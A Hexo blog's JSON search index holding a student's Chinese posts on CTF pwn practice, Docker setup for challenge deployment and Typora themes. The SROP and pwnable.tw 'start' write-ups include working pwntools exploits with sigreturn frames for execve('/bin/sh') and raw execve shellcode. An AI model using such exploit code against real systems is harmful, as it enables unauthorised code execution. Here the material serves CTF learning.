{"meta":{"title":"Rin","subtitle":"","description":"","author":"Rin777","url":"https://fuurinko.github.io","root":"/"},"pages":[{"title":"Rin","date":"2021-10-22T04:28:24.000Z","updated":"2021-10-29T02:57:53.219Z","comments":true,"path":"about/index.html","permalink":"https://fuurinko.github.io/about/index.html","excerpt":"","text":"双非本科20级在读，Pwn虽然很菜，但是还得学。 不正点业余插画选手，半吊子手冲咖啡爱好者。最喜欢的音乐风格是爵士慢板，前卫金属和J-Rock。"},{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:43:36.923Z","comments":true,"path":"categories/index.html","permalink":"https://fuurinko.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:46:23.612Z","comments":true,"path":"search/index.html","permalink":"https://fuurinko.github.io/search/index.html","excerpt":"","text":""},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:44:04.740Z","comments":true,"path":"tags/index.html","permalink":"https://fuurinko.github.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-10-28T02:33:36.000Z","updated":"2021-10-29T05:50:39.292Z","comments":true,"path":"friends/index.html","permalink":"https://fuurinko.github.io/friends/index.html","excerpt":"","text":"cc_sakura:http://www.2323bb.ltdF@LLe0：https://blog.csdn.net/qq_36995313yyz:https://yyz9.cn古月浪子：https://blog.csdn.net/tqydyqtyk2eR0：https://www.yk2er0.funStar:https://www.star123.top"}],"posts":[{"title":"关于我被单双引号坑了这件事","slug":"关于我被单双引号坑了这件事","date":"2021-11-11T08:25:30.562Z","updated":"2021-11-11T08:41:57.199Z","comments":true,"path":"2021/11/11/关于我被单双引号坑了这件事/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/%E5%85%B3%E4%BA%8E%E6%88%91%E8%A2%AB%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%9D%91%E4%BA%86%E8%BF%99%E4%BB%B6%E4%BA%8B/","excerpt":"","text":"​ 还是回到萌新赛出题，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。 ​ 然后索性调试一下，发现了奇点。 ​ ​ 这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是/bin/sh，但是实际是n/sh，只有后面四个字节了。 ​ 我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样： ​ 但是我的程序是这样： ​ 然后发动传统艺能，控制变量找不同，发现问题出在system('/bin/sh')上。 ​ 因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些('./') (\"./\")，看起来区别不大，实际上也没有什么影响。 ​ 但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 ​ 然后把单引号改成双引号之后，就getshell了。","categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwndocker的pwn题体验（下","slug":"pwndocker的pwn题体验（下）","date":"2021-11-10T20:04:03.336Z","updated":"2021-11-11T13:11:03.996Z","comments":true,"path":"2021/11/11/pwndocker的pwn题体验（下）/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","excerpt":"","text":"0）​ 哈哈，还是连续剧，我也想不到捏。我也不想捏。 1）问题​ pwndocker体验了快一周，目前来说主要问题有这几个： 启动tmux进行调试时机器发热严重，风扇狂转 挂载文件夹内文件不同步 快照的制作相对麻烦（时间久，步骤多） 打开需要输入命令，有点烦。 ​ 想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。 （看我的绝美终端） ​ 每天在ayanami的注视下打工也会变得快乐（不是打工） ​ 虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。 ​ 目前来说我只能应付。 3）解决方案？1​ 机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。 2​ 挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。 3​ 这个可以考虑整个一件push脚本。还没整。 4​ 直接写shell脚本，然后放在默认路径下。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"关于ctfd平台部署pwn题的吐槽","slug":"ctfd+docker+pwn","date":"2021-11-10T19:41:58.281Z","updated":"2021-11-10T19:58:06.719Z","comments":true,"path":"2021/11/11/ctfd+docker+pwn/","link":"","permalink":"https://fuurinko.github.io/2021/11/11/ctfd+docker+pwn/","excerpt":"","text":"​ 还是萌新赛，整docker给我整傻了。 ​ 因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。 ​ 然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。 ​ 直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。 ​ 然后又狠狠地push了镜像，在CTFd填了镜像的名字，这下总算靶机ready了。 ​ 然后我还是心存侥幸地试着看看nodeport生成的那个ip和port能不能nc，这一测就出问题了，nc不能。 ​ 但是这样我就没辙了。 ​ 咋办捏？remake吧！ ​ 我把所有不相关的镜像和容器狠狠地扬了，然后顺手把ctf_xinted也扬了，换了个高级的脚本，听说解决了ctf_xinted不能同时放几道题且不安全的问题。 ​ 链接在这里：https://github.com/giantbranch/pwn_deploy_chroot.git ​ 然后用这个脚本一试，我超成了。 ​ 然后就好了（ ​ ​","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"SROP学习","slug":"srop学习","date":"2021-11-07T11:11:19.208Z","updated":"2021-11-10T19:40:47.138Z","comments":true,"path":"2021/11/07/srop学习/","link":"","permalink":"https://fuurinko.github.io/2021/11/07/srop%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1)前言​ 在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。 2）SROP原理​ 当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。 ​ 所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。 ​ 借一张图说明一下： 3）SROP利用​ pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。 funsignal​ 题目地址： funsignals ​ 打开题目，是手写汇编。 ​ ​ 观察一下。程序分别通过系统调用，调用了sys_read , sys_sigreturn两个函数。 ​ 那么很明显，sys_read用来栈溢出，然后 sys_sigreturn作为返回地址。并且flag的地址都已经给出，我们只需要通过sys_write读出flag的值就行。 ​ 所以我们需要构造sys_write的调用 frame = SigreturnFrame() frame.rax = constants.SYS_write#write函数的系统调用号 frame.rdi = constants.STDOUT_FILENO#1 frame.rsi = elf.symbols['flag']#0x010000023 frame.rdx = 50#读取的字符数 frame.rip = elf.symbols['syscall'] ​ 这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用sys_read的时候把东西读进用户栈，然后接着调用 sys_sigreturn让内核将用户栈的东西恢复，就相当于调用了sys_write，从而读出flag的值。 ​ 但是这道题将我们需要的任何地址都给出了，甚至也不需要构造sys_sigreturn，我们通过另外一个例子来演示一下如何构造sys_sigreturn并且获得一个shell。 Smallest Pwn​ 题目：smallest pwn ​ 直接先在IDA中查看： start proc near ; DATA XREF: LOAD:0000000000400018↑o .text:00000000004000B0 xor rax, rax .text:00000000004000B3 mov edx, 400h ; count .text:00000000004000B8 mov rsi, rsp ; buf .text:00000000004000BB mov rdi, rax ; fd .text:00000000004000BE syscall ; LINUX - sys_read .text:00000000004000C0 retn .text:00000000004000C0 start endp .text:00000000004000C0 .text:00000000004000C0 _text ends .text:00000000004000C0 .text:00000000004000C0 .text:00000000004000C0 end start ctf-wiki题解​ 可以看到程序本身就是一个sys_read。所以我们需要利用它来getshell，难度可想而知。 ​ 由于题目只给出了sys_read，但是泄露程序内存我们肯定是需要一个sys_write 的，所以这里有一个trick，就是通过将sys_read的返回值构造成函数的系统调用号。然后调用sys_write以及sys_sigreturn。 ​ 那么来看详细的分析 ​ 首先需要调用sys_write，系统调用号为4，也就是需要sys_read返回读入四个字符，将rax的值赋为4。 ​ 顺便sys_sigreturn的返回值为119。 ​ 然后看exp： payload = p64(start_addr) * 3 sh.send(payload) ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 ## get stack addr sh.send('\\xb3') stack_addr = u64(sh.recv()[8:16]) log.success('leak stack addr :' + hex(stack_addr)) ​ 首先发送三次start_addr，第一次使得程序执行流重新回到start，但是在重新执行时输入\\xb3 ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从0x4000B3开始。(第三个地址的作用会在后面体现) ​ 同时我们读入的\\xb3 ,仅有一个字节，这使得sys_read的返回值为1，存在rax中，程序在这里就相当于执行了 mov rax, 1 mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_write 所以此时相当于进行了一个系统调用号为1的系统调用,也就是sys_write函数。 ​ 并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。 ​ 回忆一下，srop的关键是通过sys_sigreturn来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。 ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的 sigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号 sigframe.rdi = 0#read参数 sigframe.rsi = stack_addr#read参数，在栈上读入 sigframe.rdx = 0x400#read参数，读多大 sigframe.rsp = stack_addr#sigframe参数 sigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址 payload = p64(start_addr) + 'a' * 8 + str(sigframe) sh.send(payload) ​ 接着我们开始构造sys_sigreturn ## set rax=15 and call sigreturn sigreturn = p64(syscall_ret) + 'b' * 7#读入15字节 sh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15. ​ 这样我们就成功地调用了sys_sigreturn ,此时我们已经可以向用户栈中读入任意数据了。 ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe) print len(frame_payload) payload = frame_payload + (0x120 - len(frame_payload)) * '\\x00' + '/bin/sh\\x00' sh.send(payload) sh.send(sigreturn) ​ 我们再次利用SigreturnFrame()来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用sys_sigreturn来触发。 ​ 所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用sys_write泄露栈地址，通过两次调用sys_sigreturn，第一次执行sys_read，将execute(\"/bin/sh\")写入用户栈，第二次调用sys_sigreturn来getshell。 自己的反思​ 有一个疑惑，就是既然我们能够通过控制rax而控制syscall，而普通的sys_read也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？ ​ 怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的： reread = 0x4000b0 syscall = 0x4000be rereadaddr = p64(reread) syscalladdr = p64(syscall) context.clear() context.arch = \"amd64\" frame = SigreturnFrame() frame.rax = 59 frame.rdi = 0x7fffffffe4e8 frame.rip = syscall binsh='/bin/sh' playload1 = rereadaddr+'a'*8+ str(frame)+binsh p.send(playload1) playload2 = syscalladdr+'a'*7 p.send(playload2) #http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/ ​ ​ 可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。 ​ 去查了一些资料，发现还是对于SigreturnFrame()的理解不够透彻。 ​ SigreturnFrame()中有一个非常重要的part：sigframe.rsp ​ 我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。 ​ 所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过sys_write ,来回跳转执行流。 4）总结​ 非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。 5）参考​ 2017 429 ichunqiu ctf smallest(pwn300) writeup SROP","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"pwndocker的pwn题体验（上）","slug":"pwndocker的pwn题体验（上）","date":"2021-11-02T14:54:29.012Z","updated":"2021-11-11T13:11:50.696Z","comments":true,"path":"2021/11/02/pwndocker的pwn题体验（上）/","link":"","permalink":"https://fuurinko.github.io/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","excerpt":"","text":"1）前言​ 之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。 2）pwndocker启动​ 首先是如何build pwndocker的问题。 ​ 如果直接docker pull pwndocker，速度一般会很慢。 ​ 这里参考一篇博客的做法：skysider/pwndocker 正确使用姿势。 ​ docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0从阿里云上拉取镜像，使得速度变快。 ​ 拉取完之后重命名镜像。docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker ​ 然后可以 docker run -d \\ --rm \\ -h ${ctf_name} \\ --name ${ctf_name} \\ -v $(pwd)/${ctf_name}:/ctf/work \\ -p 23946:23946 \\ --cap-add=SYS_PTRACE \\ skysider/pwndocker ​ 运行镜像。 ​ 但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用 docker run -it skysider/pwndocker /bin/bash是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。 ​ ​ 我们可以先用docker cp来将题目的文件拷贝至容器中。 ​ ​ 关于docker cp指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。 ​ 如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过docker run指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过docker start和docker attach来进入容器就行。 ​ 愉快的gdb时间（（ ​ 还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。 ​ 然后是做题时间。 ​ 这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。 ​ ​ ps：关于cyclic的原理可以看我的pwntools源码解析系列。 ​ 然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。 ​ 还是要借助docker run的- v参数，大概就是~/work/pwner:/ctf/work ​ 但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？ ​ 后来重启一次之后就能立即同步到容器中了。好。 ​ 有一点离谱。 ​ 虽然但是，我超，pwndokcer真的好用。 ​ 鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（ ​ 所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。 ​ 然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。 ​ shellcode就没必要手写了，pwntools.shallcraft直接生成。 from pwn import* p = remote('chall.pwnable.tw',10000) shellcode = asm(shellcraft.sh()) payload = b'a'*20 payload += shellcode p.send(payload) p.interactive() ​ 摸了一圈，又EOF力。 ​ 换了祖传exp。 from pwn import* p = remote(\"chall.pwnable.tw\",10000) #p = process(\"./start\") #shellcode = asm(shellcraft.sh()) shellcode = b'\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80' buf_addr = 0xffffd284 payload = b'a'*0x14 payload += p32(0x8048087) p.sendafter(\"Let's start the CTF:\",payload) stack_addr = u32(p.recv(4)) print(hex(stack_addr)) payload = b'a'*20 payload += p32(stack_addr+20) payload += shellcode p.send(payload) p.interactive() ​ 所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。 ​ shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。 ​ 在调试的时候又出现了新问题。 ​ 搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。 ​ 在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。 ​ 这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。 ​ 虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。 ​ 这里留个疑点吧。 ​ 还是回到题目本身。也就是无法gdb.attach()的问题。 ​ 原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。 ​ 我傻了。坑是真的多。 ​ 果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。 ​ 在修改源码后解决问题，详情可以参考：pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案。 ​ 解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。 ​ 百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。 ​ 对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。 ​ ​ ​ 尝试了一下一种新的下断点方式。 ​ 回到题目，很显然如果摁执行shellcode，就根本没有反应（（ ​ eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。 ​ 新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。 ​ 好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的） ​ 这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后 ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。 ​ (真有够麻烦的) 3）漏洞利用 ​ 看一下发现不对头，这个返回地址是我们的shellcode。 ​ 按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。 ​ 然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。 ​ 那么我们要retn到哪里呢？ ​ 既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。 ​ 既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用sys_write 对栈上内存进行一个读取。 ​ 那么如何利用捏。 ​ 从这里我们可以清楚地看到，这几条指令分别设置了sys_write的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。 ​ mov ecx, esp将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。 ​ ![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png) ​ 其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。 ​ 当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。 ​ 这时候程序还是会按照原有的指令执行，比如说下一个sys_read函数。 ​ 这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，sys_read会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20） ​ 然后直接溢出到栈地址。 ​ 执行shellcode ​ hhx 4）总结​ 这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。 ​ 动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！ ​ 另外容器要记得及时备份55. ​ 还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。 ​","categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"docker学习笔记","slug":"docker基础学习笔记","date":"2021-11-01T12:33:17.866Z","updated":"2021-11-04T00:36:44.081Z","comments":true,"path":"2021/11/01/docker基础学习笔记/","link":"","permalink":"https://fuurinko.github.io/2021/11/01/docker%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"​ 还是最近需要部署pwn题至平台，所以需要学习一定的docker容器知识。我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。 1 docker基础架构​ 对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。 1.1 为什么要有docker？​ 一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。 ​ 为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。 ​ 但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。 ​ linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。 ​ 而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 1.2 docker基础知识​ 之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。 ​ image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 1.3 docker基础命令​ 首先我们需要拉取镜像至本地，可以通过docker pull命令。例如： $ docker image pull library/hello-world ​ ​ 拉取镜像需要一定时间的等待，拉取完成后，通过docker image ls可以查看本地的docker镜像。 ​ ​ 这个hello world其实就是被打包好的在特定环境下的程序，我们可以通过docker cantainer run hello-world指令将镜像创建为容器并运行。 docker build​ build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是 $ docker build -t imagename . ​ 虽然我不是很理解这个-t 的参数意义何在，并且镜像名后面的“.”是干啥的。 docker run​ 创建一个新的容器并运行 ​ 一般来说会有这几个参数 -d: 后台运行容器，并返回容器ID； -it: 以交互模式运行容器，并创建一个伪终端； -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 --name=\"nginx-lb\": 为容器指定一个名称； -v：映射主机文件夹至容器内 docker start/stop/retart​ 启动或停止容器。 ​ 指令为docker start/stop/retart containerID docker pause​ 暂停容器内全部进程。 docker kill​ kill 运行的容器进程 docker ps​ 列出容器。 -a :显示所有的容器，包括未运行的。 docker attach​ 连接到正在运行中的容器。 docker attach containerID docker inspect​ 获取容器/镜像的元数据。 参考Docker 入门教程 Docker 镜像使用 ​ ​","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"基于ctf pwn环境的docker搭建","slug":"基于ctf pwn环境的docker配置","date":"2021-10-31T15:04:01.604Z","updated":"2021-11-10T19:45:11.412Z","comments":true,"path":"2021/10/31/基于ctf pwn环境的docker配置/","link":"","permalink":"https://fuurinko.github.io/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","excerpt":"","text":"1）​ 最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架。 2）​ 首先是框架的选择，pwn的框架其实很多，这里随便选一个最基础的ctf_xinted。 ​ 首先我们需要做的是把项目clone到本地。 ​ 通过指令cat Dockerfile可以看到dockerfile。 ​ dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到ctf_xinetd的文件夹下，然后执行 sudo docker build -t \"helloworld\" . ​ (注意后面的“.”) ​ 这个时候一般就会创建helloworld这个镜像，我们只需要等待创建结束，然后执行 sudo docker run -d -p \"0.0.0.0:10001:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld ​ 0.0.0.0表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。 ​ 如果运行正常，此时我们是能够通过 nc 0.0.0.0 10001来连接我们的docker容器的。 ​ 但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样 sudo service docker restart ​ 这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。 ​ 但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"typora主题配置的一些心得","slug":"typora主题配置的一些心得","date":"2021-10-29T15:20:57.419Z","updated":"2021-10-30T07:22:18.232Z","comments":true,"path":"2021/10/29/typora主题配置的一些心得/","link":"","permalink":"https://fuurinko.github.io/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"![触控栏快照2021-10-29 下午11.50.07](/Users/rin/Desktop/触控栏快照2021-10-29 下午11.50.07.png) 1）​ 由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。 2）​ 在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。 ​ 这里以主题mint为例，css中:root元素声明了全局css变量，如下： :root { --side-bar-bg-color: #ffffff;//边栏颜色 --control-text-color: #6B6B6B;//边栏文件未选中字体颜色 --active-file-bg-color: #ecf6f2;//边栏文件背景颜色 --active-file-border-color: #6B6B6B;//不清楚是个啥 --active-file-text-color: #202020;//边栏文件选中后字体颜色 --table-even-row-color:#f8fcfa;//不清楚是个啥 --table-head-color:#d9ede5;//不清楚是个啥 --deep-theme-color: #c2e2d5;//深色模式主题色 --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色 } ​ 所以如果想修改各种配色，只需要修改对应颜色的hex就行。 ​ 这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（ ​ 